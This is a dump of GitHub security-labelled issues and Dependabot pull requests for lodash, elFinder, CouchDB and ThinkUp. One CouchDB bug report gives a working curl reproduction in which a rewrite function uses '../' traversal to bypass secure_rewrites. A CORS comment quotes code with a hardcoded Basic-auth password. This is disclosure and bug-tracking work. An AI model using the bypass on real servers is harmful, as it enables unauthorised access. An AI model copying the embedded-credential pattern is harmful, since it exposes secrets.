<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~bnjmnt4n"">bnjmnt4n</a>, a new releaser for lodash since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.4&new-version=4.17.21)](https://dependabot.com/compatibility-score/?dependency-name=lodash&package-manager=npm_and_yarn&previous-version=4.17.4&new-version=4.17.21)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,922458524,"[Security] Bump studio-42/elfinder from 2.1.57 to 2.1.59","Bumps [studio-42/elfinder](https://github.com/Studio-42/elFinder) from 2.1.57 to 2.1.59. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-qm58-cvvm-c5qr"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Unsafe upload filtering leading to remote code execution</strong></p>
<h3>Impact</h3>
<p>Before elFinder 2.1.58, the upload filter did not disallow the upload of <code>.phar</code> files. As several Linux distributions are now shipping Apache configured in a way it will process these files as PHP scripts, attackers could gain arbitrary code execution on the server hosting the PHP connector (even in minimal configuration).</p>
<h3>Patches</h3>
<p>The issue has been addressed with <a href=""https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1"">https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1</a>, associating <code>.phar</code> files to the right MIME type. Unless explicitly allowed in the configuration, such files cannot be uploaded anymore. This patch is part of the last release of elFinder, 2.1.58.</p>
<h3>Workarounds</h3>
<p>If you can't update to 2.1.58, make sure your connector is not exposed without authentication.</p>
<h3>Important tips</h3>
<p>Server-side scripts can often be created as text files. Currently, elFinder has an appropriate MIME type set for file extensions that are generally runnable on a web server.</p>
<p>However, the server has various settings. In some cases, the executable file may be judged as &quot;text/plain&quot;. Therefore, elFinder installers should understand the extensions that can be executed on the web server where elFinder is installed, and check if there are any missing items in the elFinder settings.</p>
<p>The elFinder PHP connector has an option &quot;additionalMimeMap&quot; that specifies the MIME type for each extension. See <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3295#issuecomment-853042139"">#3295(comment)</a> for more information.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 2.1.58</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/Studio-42/elFinder/releases"">studio-42/elfinder's releases</a>.</em></p>
<blockquote>
<h2>Version 2.1.59</h2>
<h3>Changes form previous version</h3>
<p><a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">All previous changes is here.</a></p>
<ul>
<li>[Security:php] Fixed multiple vulnerabilities leading to RCE</li>
<li>[php:session] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3278"">#3278</a> wrong code of typo</li>
<li>[js:core] <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3351"">#3351</a> allow columnsCustomName[x] to be a function</li>
<li>[css:quicklook] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3240"">#3240</a> remove unnecessary color specifications</li>
<li>[cmd:extract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3252"">#3252</a> for checking the existence of existing files</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3359"">#3359</a> add an option &quot;noResizeBySelf&quot;</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3216"">#3216</a> missing url option on upload into root</li>
<li>And some minor bug fixes</li>
</ul>
<h2>Version 2.1.58</h2>
<h3>Changes form previous version</h3>
<p><a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">All previous changes is here.</a></p>
<ul>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3151"">#3151</a> support RAR5 lib</li>
<li>[cmd:fullscreen] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3177"">#3177</a> wrong fullscreen button caption</li>
<li>[js:core] Supports cookie samesite attribute</li>
<li>[VD:SFTP] Add new SFTP driver, via phpseclib library</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3193"">#3193</a> auto-detection of baseUrl</li>
<li>[js:upload] Fixed upload bug (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3264"">#3264</a>)</li>
<li>[VD:abstract,php] make the thumbnail support webp (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3265"">#3265</a>)</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3250"">#3250</a> error only variables can be passed by reference</li>
<li>[VD:abstract] add 'phar:*' =&gt; 'text/x-php' into 'staticMineMap'</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3181"">#3181</a> add an option uploadMaxMkdirs</li>
<li>[php:core] Add cwd param to proc_open (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3281"">#3281</a>)</li>
<li>[VD:abstract] Bugfix of an option mimeDetect (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3291"">#3291</a>)</li>
<li>[UI] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3302"">#3302</a> problem of d&amp;d when copy of UI command is disabled</li>
<li>And some minor bug fixes</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/Studio-42/elFinder/blob/master/Changelog"">studio-42/elfinder's changelog</a>.</em></p>
<blockquote>
<p>2021-06-13  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.59):
<ul>
<li>[Security:php] Fixed multiple vulnerabilities leading to RCE</li>
<li>[php:session] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3278"">#3278</a> wrong code of typo</li>
<li>[js:core] <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3351"">#3351</a> allow columnsCustomName[x] to be a function</li>
<li>[css:quicklook] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3240"">#3240</a> remove unnecessary color specifications</li>
<li>[cmd:extract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3252"">#3252</a> for checking the existence of existing files</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3359"">#3359</a> add an option &quot;noResizeBySelf&quot;</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3216"">#3216</a> missing url option on upload into root</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2021-06-09  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.58):
<ul>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3151"">#3151</a> support RAR5 lib</li>
<li>[cmd:fullscreen] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3177"">#3177</a> wrong fullscreen button caption</li>
<li>[js:core] Supports cookie samesite attribute</li>
<li>[VD:SFTP] Add new SFTP driver, via phpseclib library</li>
<li>[js:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3193"">#3193</a> auto-detection of baseUrl</li>
<li>[js:upload] Fixed upload bug (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3264"">#3264</a>)</li>
<li>[VD:abstract,php] make the thumbnail support webp (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3265"">#3265</a>)</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3250"">#3250</a> error only variables can be passed by reference</li>
<li>[VD:abstract] add 'phar:*' =&gt; 'text/x-php' into 'staticMineMap'</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3181"">#3181</a> add an option uploadMaxMkdirs</li>
<li>[php:core] Add cwd param to proc_open (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3281"">#3281</a>)</li>
<li>[VD:abstract] Bugfix of an option mimeDetect (<a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3291"">#3291</a>)</li>
<li>[UI] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3302"">#3302</a> problem of d&amp;d when copy of UI command is disabled</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2020-06-05  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.57):
<ul>
<li>[js] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3148"">#3148</a> to support jQuery 3.5.0 update</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3154"">#3154</a> volume that require online access cannot be specified</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3161"">#3161</a> fix option data of cwd results on after change files</li>
<li>[VD:abstract] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3167"">#3167</a> added &quot;none&quot; (no image library check) to <code>imgLib</code></li>
<li>[cmd:resize] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3158"">#3158</a> to make able to change quality without changing dimensions</li>
<li>And some minor bug fixes</li>
</ul>
</li>
</ul>
<p>2020-04-09  Naoki Sawada  <a href=""mailto:hypweb+elfinder@gmail.com"">hypweb+elfinder@gmail.com</a></p>
<ul>
<li>elFinder (2.1.56):
<ul>
<li>[js:extras:editors.default] remove Pixlr editor it is no longer possible to display in IFRAME</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3134"">#3134</a> close file pointer before deleting temporary file on shutdown</li>
<li>[VD:abstract] change prefix of zipdl temp file</li>
<li>[php:core] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3136"">#3136</a> zipdl fails on Chrome on iOS / iPadOS</li>
<li>[cmd:netmount] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3138"">#3138</a> OAuth not possible with CORS due to new ITP</li>
<li>[VD:MySQL,OneDrive] Fixed <a href=""https://github-redirect.dependabot.com/Studio-42/elFinder/issues/3142"">#3142</a> remove debug code</li>
<li>[i18n:pl,ko] Updated translations</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/Studio-42/elFinder/commit/06ada3132cefd057e1d89cb016f8c82473d420d4""><code>06ada31</code></a> release elFinder version 2.1.59</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/33b70254c7e9da9b1c6658bd0fbae14ab807157e""><code>33b7025</code></a> src build elFinder-2.1-c921a71</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/568d3e765ace6922657730f4dfc5aaaf5fa952e7""><code>568d3e7</code></a> src build elFinder-2.1-28ea040</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/083cb0884db93f208e4e3937af28d380e8791596""><code>083cb08</code></a> release elFinder version 2.1.59</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/f4f7cd2deee0d39e6808426648b8c7e29be13cf9""><code>f4f7cd2</code></a> src build elFinder-2.1-cb8c1e8</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/07ab6a64dd4461626274e5f6c6eeb8ae18020d98""><code>07ab6a6</code></a> merge master README.md</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/34caa9e0fc091d38ad10aeadb49bc1a0112bc343""><code>34caa9e</code></a> src build elFinder-2.1-6218e9b</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/395b806521cfe58577408ef860e2a8bd0270dcf9""><code>395b806</code></a> src build elFinder-2.1-90be103</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/04fa60cbed19a18204ffd39a6eaacdec051514f6""><code>04fa60c</code></a> src build elFinder-2.1-185ac78</li>
<li><a href=""https://github.com/Studio-42/elFinder/commit/3802892cf32e999f08143107c5686e84ce837164""><code>3802892</code></a> release elFinder version 2.1.58</li>
<li>Additional commits viewable in <a href=""https://github.com/Studio-42/elFinder/compare/2.1.57...2.1.59"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=studio-42/elfinder&package-manager=composer&previous-version=2.1.57&new-version=2.1.59)](https://dependabot.com/compatibility-score/?dependency-name=studio-42/elfinder&package-manager=composer&previous-version=2.1.57&new-version=2.1.59)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
apache/couchdb,348396049,"Multi-tenancy support","Cloudant has this. Would be great if open source CouchDB had this too.

Depends on #1504 .","I have a node.js based proxy prototype of this (closed source at the moment) that could help with inspiration. I might be able to share its test suite in the future.I have used Couchdb in past as a secondary database in SaaS apps it was never my main storage.
I'm not sure if I really need multi-tenancy builtin, because it would increase the docs complexity. 

But I would love to see the proxy @janl  mentioned, actually I'm planing to port an tenant handler we have from PHP to node.js and open source it (it's actually for mysql but I can create wrapper for other database).

Can you share something about the common strategies  used? one database per tenant or all data in a single database and proxy controls what each tenant can see?




@manobi you may also want to look at the _access proposal for CouchDB 3.0, which helps with the latter scenario. I think this might be better for your situation, frankly. See #1524 for details.@wohali Thanks for sharing, I will be following your recommendation.",no,"api,security,feature,roadmap,"
apache/couchdb,351188480,"Provide configuration option enforcing AuthSession cookies' ""Secure"" attribute in couch_httpd_auth","<!--- Provide a general summary of the issue in the Title above -->

## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->
I propose adding a new configuration option to `couch_httpd_auth` to unconditionally enforce the [`Secure`](https://tools.ietf.org/html/rfc2109.html#section-4.2.2) attribute for `AuthSession` cookies created via `/_session` API.

The new option would be Boolean, with a default value of `false`.

Enabling this option would force inclusion of the `Secure` cookie attribute for all `set-cookie` authentication response headers, with no respect to configuration elsewhere (e.g. in `[ssl]`).

## Current Behavior
<!--- If describing a bug, tell us what happens instead of the expected behavior -->
<!--- If suggesting a change/improvement, explain the difference from current behavior -->
CouchDB only adds the `Secure` attribute to `set-cookie` response headers when CouchDB's built-in SSL is enabled. 

For stacks with SSL-terminating reverse-proxies or load-balancers (i.e. secure setups _not_ utilizing CouchDB's built-in SSL on the backend), this is a potential user authentication security vulnerability as the absence of the `Secure` cookie attribute allows browsers to transmit `AuthSession` cookies in clear text over insecure connections.

## Possible Solution
<!--- Not obligatory, but suggest a fix/reason for the bug, -->
<!--- or ideas how to implement the addition or change -->

In `default.ini`:

```ini
[couch_httpd_auth]
; alternative option names: cookies_always_secure, secure_cookies_only 
force_secure_cookies = false ; default setting

``` 

Excusing my unfamiliarity with Erlang...

In [/src/couch/src/couch_httpd_auth.erl](https://github.com/apache/couchdb/blob/7597abf850870bb63e115ec004106b403a9be42c/src/couch/src/couch_httpd_auth.erl#L428):
```erlang
cookie_scheme(#httpd{mochi_req=MochiReq}) ->
    [{http_only, true}] ++
    % Check the configuration value here, first.
    % If configured as true, assign [{secure, true}] and return
    % Else, continue to case below
    case MochiReq:get(scheme) of
        http -> [];
        https -> [{secure, true}]
    end.
```
## Steps to Reproduce (for bugs)
<!--- Provide a link to a live example, or an unambiguous set of steps to -->
<!--- reproduce this bug. Include code to reproduce, if relevant -->
N/A

## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->
IMO there's also a good argument for defaulting this option to `true`:

If `AuthSession` cookies are `Secure` by default, frontend developers will see errors in the browser when attempting to transmit the cookie insecurely, and must actively change the configuration to allow transmission over http. Conversely, browsers happily send `AuthSession` cookies in the clear if no `Secure` attribute is present, which can easily go unnoticed 🙈

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->
* Version used: 2.2.0
* Browser Name and version: All
* Operating System and version (desktop or mobile): All
* Link to your project: N/A
","I think the concern here is: how many programmatic clients would such a change break? I see your point on browsers, but to be honest, most CouchDB access ""in the field"" is via language-native clients.

If this would break the large majority of them (and I expect it would), I would be -1 on this change.@wohali thanks as always for your insight:

> ... how many programmatic clients would such a change break? ... most CouchDB access ""in the field"" is via language-native clients.

Interesting! For clarity, you're implying that most programmatic clients rely on `/_session` cookies for authentication? [pouchdb-authentication](https://www.npmjs.com/package/pouchdb-authentication) as a purely front-end `/_session` interface, for example, averages ~750 installs per week. Is that indeed trivial compared to these programmatic clients?


> If this would break the large majority of them (and I expect it would) ...

That's why I propose this be **disabled by default** i.e. purely opt-in.
 
Perhaps a broader discussion on bringing `/_session` cookies up to a modern spec would be more appropriate, first? [RFC 2109](https://tools.ietf.org/html/rfc2109.html) reached legal US drinking age this year! 🍻The project I'm working on is being affected by the enforcement of SameSite=none and Secure being needed for _session cookies.  While Couchdb 3 (which we will be trying out soon) does add the SameSite attribute, the Secure attribute is still missing since we are using a reverse proxy to securely access our databases (as direct SSL is unreliable).  Could this please be addressed as it would be difficult to reliably intercept responses on our proxy and alter the cookie header manually.@thebigh2014 adding a `Secure` attribute is a pretty standard thing in most reverse proxies. What proxy are you using?@willholley We've been using [Redbird](https://github.com/OptimalBits/redbird/) but since it doesn't provide built-in support for modifying response headers, I'm going to be trying Apache reverse proxy (since Apache is already running for other things on our server).  Thanks for your reply.",no,"security,enhancement,"
apache/couchdb,350558775,"Prevent modification of /_users/_security object with opt-out ini file setting","
## Expected Behavior
Modifying the `_security` object inside of `_users` is unsupported, and can lead to some unusual behaviour - see #1556.

## Current Behavior
We allow people to shoot themselves in the foot by modifying `_users/_security`.

## Possible Solution
Always return a `403` on write attempts for `_users/_security`. @rnewson do you have any comment on this?

## Steps to Reproduce (for bugs)
1. `dev/run -n 1 --with-admin-party-please`
2. `curl -X PUT http://localhost:15984/_users/_security -d '{""foo"": ""bar""}'

## Context
People are trying to change the rules for who can read/write documents in `_users` and it goes very badly.

## Your Environment
* Version used: 2.2.0
","It's a difficult thing to remove at this late stage, though I agree with the proposal.

Should we fold this into the broader push to hide these databases behind an API that enforces only the semantics we wish?@rnewson If a naive block is a problem for 2.x, we can just say this is backwards-incompatible and fold it into #1504 if you want, sure. I just thought maybe a 2.3 that blocked `_users/_security` writes wouldn't be too hard to implement, and shouldn't affect TOO many people...It's hard to know how many have changed the security object of _users. Those that have done so and _not_ encountered a problem will be broken by this change; those that _have_ encountered a problem will have had to reverse their change already.

I think we should save the breakingchangeness until we present a full replacement for this; the API that sits in front of this database and only permits what it ought to.
+1, let's leave this unti #1504. I'll close this for now.Alternatively, like we've done with default db security and making _all_dbs an opt-in config value could help folks until we have a proper fix. yes, I can see that. [couchdb] users_db_security_editable=false|true or something, defaulting to false in the new default.iniIf we're OK with that alternative for 2.x, I'll re-open this.",no,"bug,security,beginner-friendly,"
apache/couchdb,567259808,"Cross Origin configuration not working","[NOTE]: # ( ^^ Provide a general summary of the issue in the title above. ^^ )

## Description

I'm attempting to use CouchDB directly from a browser-based application.  I have configured CORs as directed in the documentation, and via the Fauxton Administrative interface, verified it is enabled.  However, when I run an XMLHttpRequest in Chrome, it fails with a denial saying that ""Http did not return with status code 200"".  

When running an ""OPTIONS"" request with curl, it also fails with 
```{""error"":""method_not_allowed"",""reason"":""Only DELETE,GET,HEAD,POST allowed""}```


## Steps to Reproduce

[NOTE]: # ( Include commands to reproduce, if possible. curl is preferred. )

## Expected Behaviour

After configuring CORs configuration, OPTIONS request respond correctly with appropriate headers.

## Your Environment


* CouchDB version used: 2.3
* Browser name and version: Chrome  80.0.3987.116
* Operating system and version: Fedora 31

## Additional Context


","Looks like a reprise of https://issues.apache.org/jira/browse/COUCHDB-2027 .Is this a useful workaround for you?

> My problem was solved by:
> 
> 1. adding headers= accept, authorization, content-type, origin into [cors] section of local.ini // the docs were not clear to me about this
> 2. Adding an Authorization header in my AJAX request :

```javascript
$.ajax({
type: ""GET"",
contentType: ""application/json"",
dataType: ""json"",
url: myUrl
beforeSend: setHeader,
error: function (error)
{ console.log(error); }

,
success: function (remoteAppInfo)
{ ... }

});

function setHeader(xhr)
{ console.log(""setHeader""); xhr.setRequestHeader('Authorization',""Basic "" + btoa(""estanteuser:Dnbatfydnkwadm6f"")); } 
```Also see https://github.com/pouchdb/add-cors-to-couchdb",no,"api,bug,security,"
apache/couchdb,348339395,"Redesign CouchDB security system","@janl:
>
> * closed by default
> * more fine-grained permissions
> * more options for delegated authentication
>
> Our security system is slowly grown and not coherently designed. We should start over. I have many ideas and opinions, but they are out of scope for this. I think everybody here agrees that we can do better. This *very likely* will *not* include per-document ACLs as per the often stated issues with that approach in our data model.

@davisp:
>Big +1 on this. The auth stuff in our code base is hard to follow and difficult to hold in my brain. Taking a step back to redesign from the ground up would be super awesome.","It would be good to see a clearly defined security layer cut through the database horizontally in any refactoring / building from scratch (e.g., sitting above fabric, so anything below fabric can assume authorised). This would also help a lot with any efforts to separate out different database subsystems, if, e.g., the whole storage subsystem doesn't have to care about users, roles etc.Some links:

@rnewson today mentioned implementing [XACML](https://en.wikipedia.org/wiki/XACML) at IBM/Cloudant to replace the current roles system, and I don't see any reason we couldn't consider mirroring this framework, if not the implementation. (Eew, XML.) Robert is going to ask @kocolosk how much of the IBM implementation he can discuss in public. In short, their model doesn't have the PDP layer inside of Couch; if we took the same approach, we'd have to build a PDP inside of Couch, which could consult whatever source of information it wanted. This might or might not include such things as `_security` objects, depending on how we wish to implement things.

The thought occurred to me that web-of-trust systems might be useful in this space as well, since it was mentioned on the Wikipedia page for XACML. It'd be especially interesting from a CouchDB replication trust model as well. I think this might be a separate ticket, however. Upcoming (but not yet widespread) standards in this space include DID and OCAP-LD from the W3C.Mostly, for me, there are a few things that [our IAM implementation](https://console.bluemix.net/docs/services/Cloudant/guides/iam.html) does which would be really nice:

- Convert a request (based on request path) to a symbolic action name which can then be used for authz and for request dispatching within the system (rather than having various places parsing URL paths etc.). E.g., `couchdb.db.read-document`.
- There is a flexible actions to roles mapping that can be set up by an admin -- so we'd be able to allow a couch admin to create and ""operator"" role and specify what that role has access to (e.g., the various `_info` endpoints, things under `/_admin` and so on).
- Likely the `_security` doc format needs to be altered to allow for a more flexible role/user/group mappings.

I like the idea of chttpd converting the HTTP request into some kind of object that's specific to the request being made, like a view request, and validating all the parameters when creating that request-specific object, rather than passing down the HTTP request itself. I think this would be needed to really have a solid security split, as the lower levels could assume both the request is allowed and that the data can be trusted.",no,"security,enhancement,roadmap,"
apache/couchdb,404139990,"Rewrites function bypasses secure_rewrites setting","## Description

Using a rewrites function allows you to access other paths that secure_rewrites usually blocks.

## Steps to Reproduce

```
~$ curl -X PUT 'http://127.0.0.1:5984/r'
{""ok"":true}

~$ curl -X PUT 'http://127.0.0.1:5984/r/_design/n' -d $'{""rewrites"": ""function (r) { return { path:\'../../../\' + r.path.slice(4).join(\'/\') } } ""}'
{""ok"":true,""id"":""_design/n"",""rev"":""1-08f4fea4ee5b841159d913a4aa25d6c7""}

~$ curl 'http://127.0.0.1:5984/r/_design/n/_rewrite/_uuids'
{""uuids"":[""6c59d2b3e582f05f7589fc2cef0a49c4""]}
```

## Expected Behaviour

The final curl above should have returned ""insecure_rewrite_rule"" since it allowed access to the root even though secure_rewrites is turned on.  That is what happens for rewrite rules like:

```
~$ curl -X PUT 'http://127.0.0.1:5984/r/_design/m' -d $'{""rewrites"": [{""from"": ""*"", ""to"": ""../../../*""}] }'
{""ok"":true,""id"":""_design/m"",""rev"":""1-6c7cb91e520f4bc9cfe7f33790336159""}

~$ curl 'http://127.0.0.1:5984/r/_design/m/_rewrite/_uuids'
{""error"":""insecure_rewrite_rule"",""reason"":""too many ../.. segments""}
```

## Your Environment

```
~$ curl http://127.0.0.1:5984
{""couchdb"":""Welcome"",""version"":""2.3.0"",""git_sha"":""07ea0c7"",""uuid"":""e07d95a0b0610b7bcb8e046fff5dd1b6"",""features"":[""pluggable-storage-engines"",""scheduler""],""vendor"":{""name"":""The Apache Software Foundation""}}
```
","Can you confirm that you have `[httpd] secure_rewrites = true`? Thanks.We do have a test for something similar, but it doesn't use wildcards.

https://github.com/apache/couchdb/blob/103a0624f309ea0d796176a55eb5faea68f26047/test/javascript/tests/rewrite.js#L418-L442Yes, this repros with secure_rewrites set to true. You can see the error returned by an insecure rewrite rule under the Expected Behavior section.",no,"bug,security,"
ThinkUpLLC/ThinkUp,2288677,"Enable version check to be done using https","When accessing thinkup over HTTPS the app will still to a HTTP request to check the latest version. This will cause an error at least in Chrome because insecure content is being loaded.

It seems like the current site isn't available over HTTPS so I guess there is more to it than just updating the code. 
","Acknowledged. We have to make thinkup.com available over SSL or not, then call it using protocol-inspecific // instead of http or https. Thanks.
Just checked back on old issues I've created and looking at 2.0 beta 8 I can't find this feature any more, is this issue even relevant? 
Yes, this is still a problem in the current version, so we can keep this ticket open.
",no,"security,"
ThinkUpLLC/ThinkUp,1655720,"Encrypt owner-specific OAuth tokens and application API keys","OAuth tokens and API keys allow an application to act on behalf of the user on a third-party service, so applications should protect those tokens with the same measures they protect the user's password. ThinkUp should hash OAuth tokens which give users access to third-party services instead of storing them in the database as cleartext.

This goes for owner-specific OAuth tokens for Facebook and Twitter stored in owner_instances, as well as application-wide API keys stored in tu_options.

http://oauth.net/core/1.0a/#rfc.section.11.6
","If we hash these tokens the same way we do passwords there is no way to get access to them again unless the user re enters them. I'm assuming this isn't what we want?
We could use symmetric key encryption, with the key being the users password and then when the user logs in decrypt the keys ?

How would we decide when to destroy the decrypted keys?
All good questions, and I don't have definite answers top of mind. Let's discuss on the dev mailing list so everyone can participate.
The user's password probably isn't the best as idea as those change semi-frequently

